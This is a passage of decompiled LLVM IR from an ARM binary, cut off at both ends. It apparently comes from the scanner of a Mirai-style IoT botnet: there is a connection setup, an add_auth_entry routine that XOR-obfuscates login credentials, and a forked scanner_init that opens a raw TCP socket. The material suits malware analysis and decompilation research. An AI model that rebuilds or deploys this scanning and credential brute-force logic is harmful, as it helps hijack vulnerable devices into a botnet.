  store i32 %v1_e310, i32* %r1.global-to-local, align 4
  br i1 %v7_e308, label %dec_label_pc_e318, label %dec_label_pc_e2c0

dec_label_pc_e318:                                ; preds = %dec_label_pc_e2fc
  store i32 %v5_e2ec, i32* %r3.global-to-local, align 4
  %v1_e328 = load i32, i32* %r6.global-to-local, align 4
  %v2_e328 = inttoptr i32 %v1_e328 to i32*
  store i32 %v0_e328, i32* %v2_e328, align 4
  %v0_e32c = load i32, i32* %r4.global-to-local, align 4
  %v1_e32c = load i32, i32* %r7.global-to-local, align 4
  %v2_e32c = inttoptr i32 %v1_e32c to i32*
  store i32 %v0_e32c, i32* %v2_e32c, align 4
  %v0_e330 = load i32, i32* %lr.global-to-local, align 4
  %v1_e330 = load i32, i32* %r8.global-to-local, align 4
  %v2_e330 = inttoptr i32 %v1_e330 to i32*
  store i32 %v0_e330, i32* %v2_e330, align 4
  %v0_e334 = load i32, i32* %r3.global-to-local, align 4
  %v1_e334 = load i32, i32* %sl.global-to-local, align 4
  %v2_e334 = inttoptr i32 %v1_e334 to i32*
  store i32 %v0_e334, i32* %v2_e334, align 4
  %v0_e338 = load i32, i32* %r3.global-to-local, align 4
  %v1_e338 = trunc i32 %v0_e338 to i8
  %v2_e338 = load i32, i32* %r5.global-to-local, align 4
  %v3_e338 = inttoptr i32 %v2_e338 to i8*
  store i8 %v1_e338, i8* %v3_e338, align 1
  br label %dec_label_pc_e33c

dec_label_pc_e33c:                                ; preds = %entry, %dec_label_pc_e344, %dec_label_pc_e318
  %v2_e33c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e33c, i32* @r4, align 4
  %v1_e340 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e340

dec_label_pc_e344:                                ; preds = %dec_label_pc_e2c4
  %v0_e344 = load i32, i32* %r3.global-to-local, align 4
  %v1_e344 = load i32, i32* %sl.global-to-local, align 4
  %v2_e344 = inttoptr i32 %v1_e344 to i32*
  store i32 %v0_e344, i32* %v2_e344, align 4
  %v0_e348 = load i32, i32* %lr.global-to-local, align 4
  %v1_e348 = load i32, i32* %r8.global-to-local, align 4
  %v2_e348 = inttoptr i32 %v1_e348 to i32*
  store i32 %v0_e348, i32* %v2_e348, align 4
  %v0_e34c = load i32, i32* %r4.global-to-local, align 4
  %v1_e34c = load i32, i32* %r7.global-to-local, align 4
  %v2_e34c = inttoptr i32 %v1_e34c to i32*
  store i32 %v0_e34c, i32* %v2_e34c, align 4
  %v0_e350 = load i32, i32* %r0.global-to-local, align 4
  %v1_e350 = load i32, i32* %r6.global-to-local, align 4
  %v2_e350 = inttoptr i32 %v1_e350 to i32*
  store i32 %v0_e350, i32* %v2_e350, align 4
  br label %dec_label_pc_e33c

; uselistorder directives
  uselistorder i32 %v9_e2f4, { 1, 0 }
  uselistorder i32 %v12_e2f0, { 1, 0 }
  uselistorder i32 %v5_e2ec, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e318, { 1, 0 }
  uselistorder i32 %v0_e31c, { 1, 0 }
  uselistorder i32 %v0_e308, { 1, 0, 2 }
  uselistorder i32 %v0_e2c4, { 1, 0 }
  uselistorder i32 %v0_e28c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_21c10.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_21c10.119 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_21c14.123, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_21c18.125, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_21c1c.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e33c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e2dc, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e368 = load i32, i32* @r4, align 4
  store i32 %v3_e368, i32* %stack_var_-16, align 4
  %v6_e368 = load i32, i32* @r5, align 4
  %v9_e368 = load i32, i32* @r6, align 4
  %v12_e368 = load i32, i32* @lr, align 4
  %v0_e36c = load i32, i32* @r0, align 4
  store i32 %v0_e36c, i32* @r5, align 4
  %v1_e370 = add i32 %v0_e36c, 4
  %v2_e370 = inttoptr i32 %v1_e370 to i32*
  %v3_e370 = load i32, i32* %v2_e370, align 4
  store i32 %v3_e370, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 58260, i32* @lr, align 4
  %v1_e390 = icmp ne i32 %v3_e370, -1
  call void @__pseudo_cond_branch(i1 %v1_e390, i32 ptrtoint (i32* @global_var_14250.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e39c = load i32, i32* @r6, align 4
  store i32 %v0_e39c, i32* %r2.global-to-local, align 4
  %v3_e3a0 = call i32 @socket(i32 2, i32 1, i32 %v0_e39c)
  store i32 %v3_e3a0, i32* %r0.global-to-local, align 4
  %v7_e3a4 = icmp eq i32 %v3_e3a0, -1
  %v1_e3a8 = load i32, i32* @r5, align 4
  %v2_e3a8 = add i32 %v1_e3a8, 4
  %v3_e3a8 = inttoptr i32 %v2_e3a8 to i32*
  store i32 %v3_e3a0, i32* %v3_e3a8, align 4
  br i1 %v7_e3a4, label %entry.dec_label_pc_e420_crit_edge, label %dec_label_pc_e3b0

entry.dec_label_pc_e420_crit_edge:                ; preds = %entry
  %v1_e428.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e420

dec_label_pc_e3b0:                                ; preds = %entry
  %v2_e374 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e3b0 = load i32, i32* @r5, align 4
  %v1_e3b0 = add i32 %v0_e3b0, 28
  store i32 %v1_e3b0, i32* @r0, align 4
  %v0_e3b4 = load i32, i32* @r6, align 4
  %v2_e3b4 = add i32 %v0_e3b0, 24
  %v3_e3b4 = inttoptr i32 %v2_e3b4 to i32*
  store i32 %v0_e3b4, i32* %v3_e3b4, align 4
  store i32 256, i32* @r1, align 4
  %v0_e3bc = call i32 @util_zero()
  store i32 %v0_e3bc, i32* %r0.global-to-local, align 4
  %v0_e3c0 = load i32, i32* @r5, align 4
  %v1_e3c0 = add i32 %v0_e3c0, 4
  %v2_e3c0 = inttoptr i32 %v1_e3c0 to i32*
  %v3_e3c0 = load i32, i32* %v2_e3c0, align 4
  store i32 %v3_e3c0, i32* @r4, align 4
  %v0_e3c4 = load i32, i32* @r6, align 4
  store i32 %v0_e3c4, i32* @r2, align 4
  store i32 %v3_e3c0, i32* %r0.global-to-local, align 4
  %v2_e3d0 = call i32 @__libc_fcntl(i32 %v3_e3c0, i32 3)
  %v1_e3d8 = or i32 %v2_e3d0, 2048
  store i32 %v1_e3d8, i32* @r2, align 4
  %v0_e3dc = load i32, i32* @r4, align 4
  store i32 %v0_e3dc, i32* %r0.global-to-local, align 4
  %v2_e3e0 = call i32 @__libc_fcntl(i32 %v0_e3dc, i32 4)
  store i32 %v2_e3e0, i32* %r0.global-to-local, align 4
  %v2_e3e8 = load i32, i32* @global_var_21c54.139, align 4
  store i32 %v2_e3e8, i32* %r2.global-to-local, align 4
  %v1_e3f0 = load i32, i32* @r5, align 4
  %v2_e3f0 = add i32 %v1_e3f0, 12
  %v3_e3f0 = inttoptr i32 %v2_e3f0 to i32*
  store i32 1, i32* %v3_e3f0, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e3fc = load i32, i32* %r2.global-to-local, align 4
  %v1_e3fc = load i32, i32* @r5, align 4
  %v2_e3fc = add i32 %v1_e3fc, 8
  %v3_e3fc = inttoptr i32 %v2_e3fc to i32*
  store i32 %v0_e3fc, i32* %v3_e3fc, align 4
  %v0_e400 = load i32, i32* @r5, align 4
  %v1_e404 = add i32 %v0_e400, 4
  %v2_e404 = inttoptr i32 %v1_e404 to i32*
  %v3_e404 = load i32, i32* %v2_e404, align 4
  store i32 %v3_e404, i32* %r0.global-to-local, align 4
  %v1_e408 = add i32 %v0_e400, 20
  %v2_e408 = inttoptr i32 %v1_e408 to i16*
  %v3_e408 = load i16, i16* %v2_e408, align 2
  %v4_e408 = zext i16 %v3_e408 to i32
  store i32 %v4_e408, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e41c = call i32 @__libc_connect(i32 %v3_e404, i32 %v2_e374, i32 16)
  store i32 %v3_e41c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e420

dec_label_pc_e420:                                ; preds = %entry.dec_label_pc_e420_crit_edge, %dec_label_pc_e3b0
  %v1_e428 = phi i32 [ %v1_e428.pre, %entry.dec_label_pc_e420_crit_edge ], [ %v3_e41c, %dec_label_pc_e3b0 ]
  %v2_e424 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e424, i32* @r4, align 4
  store i32 %v6_e368, i32* @r5, align 4
  store i32 %v9_e368, i32* @r6, align 4
  store i32 %v12_e368, i32* @lr, align 4
  ret i32 %v1_e428

; uselistorder directives
  uselistorder i32 %v3_e3a0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_e420, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e430 = load i32, i32* @r4, align 4
  %v6_e430 = load i32, i32* @r5, align 4
  %v9_e430 = load i32, i32* @r6, align 4
  %v12_e430 = load i32, i32* @r7, align 4
  %v15_e430 = load i32, i32* @r8, align 4
  %v18_e430 = load i32, i32* @sb, align 4
  %v21_e430 = load i32, i32* @sl, align 4
  %v24_e430 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_21c20.141 to i32), i32* @fp, align 4
  %v2_e438 = load i32, i32* @global_var_21c20.141, align 4
  store i32 ptrtoint (i32* @global_var_21c4c.143 to i32), i32* @sl, align 4
  %v1_e444 = add i32 %v2_e438, 1
  store i32 %v1_e444, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e450 = load i32, i32* @global_var_21c4c.143, align 4
  store i32 %v2_e450, i32* %r0.global-to-local, align 4
  %v3_e454 = mul i32 %v1_e444, 16
  store i32 %v3_e454, i32* %r1.global-to-local, align 4
  %v4_e45c = inttoptr i32 %v2_e450 to i32*
  %v5_e45c = call i32 @realloc(i32* %v4_e45c, i32 %v3_e454, i32 %arg3, i32 %v1_e444)
  %v2_e460 = load i32, i32* @global_var_21c20.141, align 4
  store i32 %v2_e460, i32* %r2.global-to-local, align 4
  store i32 %v5_e45c, i32* @r8, align 4
  %v0_e468 = load i32, i32* @r5, align 4
  store i32 %v0_e468, i32* %r0.global-to-local, align 4
  %v1_e470 = load i32, i32* @sl, align 4
  %v2_e470 = inttoptr i32 %v1_e470 to i32*
  store i32 %v5_e45c, i32* %v2_e470, align 4
  %v1_e474 = inttoptr i32 %v0_e468 to i8*
  %v2_e474 = call i32 @util_strlen(i8* %v1_e474)
  %sext = mul i32 %v2_e474, 16777216
  %v1_e478 = sdiv i32 %sext, 16777216
  %v2_e478 = add nsw i32 %v1_e478, 1
  store i32 %v2_e478, i32* @r4, align 4
  store i32 %v1_e478, i32* @r7, align 4
  store i32 %v2_e478, i32* @r0, align 4
  %v0_e484 = call i32 @malloc()
  store i32 %v0_e484, i32* %r0.global-to-local, align 4
  %v0_e488 = load i32, i32* @r5, align 4
  store i32 %v0_e488, i32* %r1.global-to-local, align 4
  %v0_e48c = load i32, i32* @r4, align 4
  store i32 %v0_e48c, i32* %r2.global-to-local, align 4
  store i32 %v0_e484, i32* %r6.global-to-local, align 4
  %v3_e494 = call i32 @util_memcpy(i32 %v0_e484, i32 %v0_e488, i32 %v0_e48c)
  store i32 %v3_e494, i32* %r0.global-to-local, align 4
  %v0_e498 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e498, 1
  %extract.t6 = trunc i32 %v0_e498 to i8
  br i1 %tmp22, label %dec_label_pc_e4bc, label %dec_label_pc_e4a0

dec_label_pc_e4a0:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e4a4

dec_label_pc_e4a4:                                ; preds = %dec_label_pc_e4a4, %dec_label_pc_e4a0
  %v2_e4ac = phi i32 [ %v1_e4b0, %dec_label_pc_e4a4 ], [ 0, %dec_label_pc_e4a0 ]
  %v1_e4a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e4a4 = add i32 %v1_e4a4, %v2_e4ac
  %v3_e4a4 = inttoptr i32 %v2_e4a4 to i8*
  %v4_e4a4 = load i8, i8* %v3_e4a4, align 1
  %v6_e4a4 = zext i8 %v4_e4a4 to i32
  %v1_e4a8 = xor i32 %v6_e4a4, 84
  store i32 %v1_e4a8, i32* %r3.global-to-local, align 4
  %v1_e4ac = trunc i32 %v1_e4a8 to i8
  store i8 %v1_e4ac, i8* %v3_e4a4, align 1
  %v0_e4b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4b0 = add i32 %v0_e4b0, 1
  store i32 %v1_e4b0, i32* %r2.global-to-local, align 4
  %v1_e4b4 = load i32, i32* @r7, align 4
  %v9_e4b4 = icmp eq i32 %v1_e4b0, %v1_e4b4
  br i1 %v9_e4b4, label %dec_label_pc_e4bc.loopexit, label %dec_label_pc_e4a4

dec_label_pc_e4bc.loopexit:                       ; preds = %dec_label_pc_e4a4
  %extract.t = trunc i32 %v1_e4b0 to i8
  br label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4bc.loopexit, %entry
  %v0_e4cc.off0 = phi i8 [ %extract.t, %dec_label_pc_e4bc.loopexit ], [ %extract.t6, %entry ]
  %v2_e4bc = load i32, i32* @global_var_21c20.141, align 4
  %v2_e4c0 = load i32, i32* @global_var_21c4c.143, align 4
  %v3_e4c4 = mul i32 %v2_e4bc, 16
  store i32 %v3_e4c4, i32* @sb, align 4
  %v2_e4c8 = add i32 %v2_e4c0, %v3_e4c4
  store i32 %v2_e4c8, i32* %r2.global-to-local, align 4
  %v3_e4cc = add i32 %v2_e4c8, 12
  %v4_e4cc = inttoptr i32 %v3_e4cc to i8*
  store i8 %v0_e4cc.off0, i8* %v4_e4cc, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e460, i32* %r3.global-to-local, align 4
  %v0_e4d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_e4d8 = load i32, i32* @r8, align 4
  %v5_e4d8 = mul i32 %v2_e460, 16
  %v6_e4d8 = add i32 %v1_e4d8, %v5_e4d8
  %v7_e4d8 = inttoptr i32 %v6_e4d8 to i32*
  store i32 %v0_e4d8, i32* %v7_e4d8, align 4
  %v2_e4dc = load i32, i32* @global_var_21c4c.143, align 4
  store i32 %v2_e4dc, i32* @r7, align 4
  %v1_e4e0 = inttoptr i32 %arg2 to i8*
  %v2_e4e0 = call i32 @util_strlen(i8* %v1_e4e0)
  %sext1 = mul i32 %v2_e4e0, 16777216
  %v1_e4e4 = sdiv i32 %sext1, 16777216
  %v2_e4e4 = add nsw i32 %v1_e4e4, 1
  store i32 %v2_e4e4, i32* @r4, align 4
  store i32 %v1_e4e4, i32* @r6, align 4
  store i32 %v2_e4e4, i32* @r0, align 4
  %v0_e4f0 = call i32 @malloc()
  store i32 %v0_e4f0, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e4f8 = load i32, i32* @r4, align 4
  store i32 %v0_e4f8, i32* %r2.global-to-local, align 4
  store i32 %v0_e4f0, i32* %r5.global-to-local, align 4
  %v3_e500 = call i32 @util_memcpy(i32 %v0_e4f0, i32 %arg2, i32 %v0_e4f8)
  store i32 %v3_e500, i32* %r0.global-to-local, align 4
  %v0_e504 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e504, 1
  %extract.t8 = trunc i32 %v0_e504 to i8
  br i1 %tmp23, label %dec_label_pc_e528, label %dec_label_pc_e50c

dec_label_pc_e50c:                                ; preds = %dec_label_pc_e4bc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %dec_label_pc_e510, %dec_label_pc_e50c
  %v2_e518 = phi i32 [ %v1_e51c, %dec_label_pc_e510 ], [ 0, %dec_label_pc_e50c ]
  %v1_e510 = load i32, i32* %r5.global-to-local, align 4
  %v2_e510 = add i32 %v1_e510, %v2_e518
  %v3_e510 = inttoptr i32 %v2_e510 to i8*
  %v4_e510 = load i8, i8* %v3_e510, align 1
  %v6_e510 = zext i8 %v4_e510 to i32
  %v1_e514 = xor i32 %v6_e510, 84
  store i32 %v1_e514, i32* %r3.global-to-local, align 4
  %v1_e518 = trunc i32 %v1_e514 to i8
  store i8 %v1_e518, i8* %v3_e510, align 1
  %v0_e51c = load i32, i32* %r2.global-to-local, align 4
  %v1_e51c = add i32 %v0_e51c, 1
  store i32 %v1_e51c, i32* %r2.global-to-local, align 4
  %v1_e520 = load i32, i32* @r6, align 4
  %v9_e520 = icmp eq i32 %v1_e51c, %v1_e520
  br i1 %v9_e520, label %dec_label_pc_e528.loopexit, label %dec_label_pc_e510

dec_label_pc_e528.loopexit:                       ; preds = %dec_label_pc_e510
  %extract.t7 = trunc i32 %v1_e51c to i8
  br label %dec_label_pc_e528

dec_label_pc_e528:                                ; preds = %dec_label_pc_e528.loopexit, %dec_label_pc_e4bc
  %v0_e538.off0 = phi i8 [ %extract.t7, %dec_label_pc_e528.loopexit ], [ %extract.t8, %dec_label_pc_e4bc ]
  %v2_e528 = load i32, i32* @global_var_21c20.141, align 4
  store i32 %v2_e528, i32* %r0.global-to-local, align 4
  %v2_e52c = load i32, i32* @global_var_21c4c.143, align 4
  %v3_e530 = mul i32 %v2_e528, 16
  store i32 %v3_e530, i32* %r1.global-to-local, align 4
  %v2_e534 = or i32 %v3_e530, 13
  %v3_e538 = add i32 %v2_e534, %v2_e52c
  %v4_e538 = inttoptr i32 %v3_e538 to i8*
  store i8 %v0_e538.off0, i8* %v4_e538, align 1
  store i32 ptrtoint (i16** @global_var_21c50.145 to i32), i32* %r4.global-to-local, align 4
  %v2_e544 = load i16, i16* bitcast (i16** @global_var_21c50.145 to i16*), align 4
  %v3_e544 = zext i16 %v2_e544 to i32
  store i32 %v3_e544, i32* %lr.global-to-local, align 4
  %v2_e54c = load i32, i32* @global_var_21c4c.143, align 4
  store i32 %v2_e54c, i32* %r2.global-to-local, align 4
  %v0_e554 = load i32, i32* %r1.global-to-local, align 4
  %v2_e554 = add i32 %v0_e554, %v2_e54c
  store i32 %v2_e554, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21c50.145 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e55c = load i32, i32* @sb, align 4
  %v1_e55c = load i32, i32* @r7, align 4
  %v2_e55c = add i32 %v1_e55c, %v0_e55c
  store i32 %v2_e55c, i32* %ip.global-to-local, align 4
  %v0_e560 = load i32, i32* %r0.global-to-local, align 4
  %v1_e560 = add i32 %v0_e560, 1
  store i32 %v1_e560, i32* %r0.global-to-local, align 4
  %v3_e564 = add i32 %v2_e554, 10
  %v4_e564 = inttoptr i32 %v3_e564 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_21c50.145 to i32), i32 16), i32 16) to i16), i16* %v4_e564, align 2
  %v0_e568 = load i32, i32* %lr.global-to-local, align 4
  %v1_e568 = trunc i32 %v0_e568 to i16
  %v2_e568 = load i32, i32* %r1.global-to-local, align 4
  %v3_e568 = add i32 %v2_e568, 8
  %v4_e568 = inttoptr i32 %v3_e568 to i16*
  store i16 %v1_e568, i16* %v4_e568, align 2
  %v0_e56c = load i32, i32* %r5.global-to-local, align 4
  %v1_e56c = load i32, i32* %ip.global-to-local, align 4
  %v2_e56c = add i32 %v1_e56c, 4
  %v3_e56c = inttoptr i32 %v2_e56c to i32*
  store i32 %v0_e56c, i32* %v3_e56c, align 4
  %v1_e570 = load i32, i32* @fp, align 4
  %v2_e570 = inttoptr i32 %v1_e570 to i32*
  store i32 %v1_e560, i32* %v2_e570, align 4
  %v0_e574 = load i32, i32* %r3.global-to-local, align 4
  %v1_e574 = trunc i32 %v0_e574 to i16
  %v2_e574 = load i32, i32* %r4.global-to-local, align 4
  %v3_e574 = inttoptr i32 %v2_e574 to i16*
  store i16 %v1_e574, i16* %v3_e574, align 2
  store i32 %v3_e430, i32* @r4, align 4
  store i32 %v6_e430, i32* @r5, align 4
  store i32 %v9_e430, i32* @r6, align 4
  store i32 %v12_e430, i32* @r7, align 4
  store i32 %v15_e430, i32* @r8, align 4
  store i32 %v18_e430, i32* @sb, align 4
  store i32 %v21_e430, i32* @sl, align 4
  store i32 %v24_e430, i32* @fp, align 4
  ret i32 %v1_e560

; uselistorder directives
  uselistorder i32 %v3_e530, { 1, 0 }
  uselistorder i32 %v1_e51c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e4f0, { 1, 0, 2 }
  uselistorder i32 %v3_e4c4, { 1, 0 }
  uselistorder i32 %v1_e4b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e484, { 1, 0, 2 }
  uselistorder i32 %v2_e460, { 1, 0, 2 }
  uselistorder i32 %v3_e454, { 1, 0 }
  uselistorder i32 %v1_e444, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e590 = load i32, i32* @r5, align 4
  %v18_e590 = load i32, i32* @sb, align 4
  %v21_e590 = load i32, i32* @sl, align 4
  %v24_e590 = load i32, i32* @fp, align 4
  %v0_e59c = call i32 @__libc_fork()
  store i32 %v0_e59c, i32* %r0.global-to-local, align 4
  %v7_e5a0 = icmp eq i32 %v0_e59c, -1
  %. = zext i1 %v7_e5a0 to i32
  %tmp369 = icmp slt i32 %v0_e59c, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24740.147 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5bc = icmp eq i32 %storemerge329, 0
  store i1 %v2_e5bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e59c, i32* @global_var_24740.147, align 4
  br i1 %v2_e5bc, label %dec_label_pc_e5d8, label %dec_label_pc_e5c8

dec_label_pc_e5c8:                                ; preds = %entry
  store i32 %v6_e590, i32* @r5, align 4
  store i32 %v18_e590, i32* @sb, align 4
  store i32 %v21_e590, i32* @sl, align 4
  store i32 %v24_e590, i32* @fp, align 4
  ret i32 %v0_e59c

dec_label_pc_e5d8:                                ; preds = %entry
  %v0_e5d8 = call i32 @util_local_addr()
  store i32 %v0_e5d8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2471c.58 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e5d8, i32* @global_var_2471c.58, align 4
  %v1_e5e4 = call i32 @rand_init(i32 %v0_e5d8)
  %v0_e5e8 = load i32, i32* @r4, align 4
  store i32 %v0_e5e8, i32* %r0.global-to-local, align 4
  %v1_e5ec = inttoptr i32 %v0_e5e8 to i32*
  %v2_e5ec = call i32 @__GI_time(i32* %v1_e5ec)
  store i32 ptrtoint (i32* @global_var_21c54.139 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e5ec, i32* @global_var_21c54.139, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e600 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_24738.151 to i32), i32* %r3.global-to-local, align 4
  %v0_e608 = load i32, i32* @r4, align 4
  store i32 %v0_e608, i32* %stack_var_-52, align 4
  store i32 %v2_e600, i32* @global_var_24738.151, align 4
  store i32 %v0_e608, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e614

dec_label_pc_e614:                                ; preds = %dec_label_pc_e614.dec_label_pc_e614_crit_edge, %dec_label_pc_e5d8
  %v2_e620 = phi i32 [ %v2_e620.pre, %dec_label_pc_e614.dec_label_pc_e614_crit_edge ], [ %v2_e600, %dec_label_pc_e5d8 ]
  %v0_e628 = phi i32 [ %v0_e658, %dec_label_pc_e614.dec_label_pc_e614_crit_edge ], [ %v0_e608, %dec_label_pc_e5d8 ]
  %v3_e61c = mul i32 %v0_e628, 256
  store i32 %v3_e61c, i32* %ip.global-to-local, align 4
  store i32 %v2_e620, i32* @lr, align 4
  %v2_e630 = mul i32 %v0_e628, 288
  %v1_e638 = add i32 %v0_e628, 1
  store i32 %v1_e638, i32* %r0.global-to-local, align 4
  %v2_e63c = add i32 %v2_e630, %v2_e620
  store i32 %v2_e63c, i32* %r2.global-to-local, align 4
  store i32 %v2_e63c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e650 = add i32 %v2_e63c, 4
  %v3_e650 = inttoptr i32 %v2_e650 to i32*
  store i32 -1, i32* %v3_e650, align 4
  %v0_e654 = load i32, i32* @r5, align 4
  %v1_e654 = load i32, i32* %r1.global-to-local, align 4
  %v2_e654 = add i32 %v1_e654, 12
  %v3_e654 = inttoptr i32 %v2_e654 to i32*
  store i32 %v0_e654, i32* %v3_e654, align 4
  %v0_e658 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e658, i32* %stack_var_-52, align 4
  %v7_e65c = icmp sgt i32 %v1_e638, 255
  br i1 %v7_e65c, label %dec_label_pc_e660, label %dec_label_pc_e614.dec_label_pc_e614_crit_edge

dec_label_pc_e614.dec_label_pc_e614_crit_edge:    ; preds = %dec_label_pc_e614
  %v2_e620.pre = load i32, i32* @global_var_24738.151, align 4
  br label %dec_label_pc_e614

dec_label_pc_e660:                                ; preds = %dec_label_pc_e614
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e66c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e66c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2473c.153 to i32), i32* %r2.global-to-local, align 4
  %v2_e674 = icmp eq i32 %v3_e66c, -1
  store i1 %v2_e674, i1* %cpsr_c.global-to-local, align 1
  %v7_e674 = icmp eq i32 %v3_e66c, -1
  store i1 %v7_e674, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e66c, i32* @r4, align 4
  store i32 %v3_e66c, i32* @global_var_2473c.153, align 4
  br i1 %v7_e674, label %dec_label_pc_e660.dec_label_pc_fc34_crit_edge, label %dec_label_pc_e684

dec_label_pc_e660.dec_label_pc_fc34_crit_edge:    ; preds = %dec_label_pc_e660
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
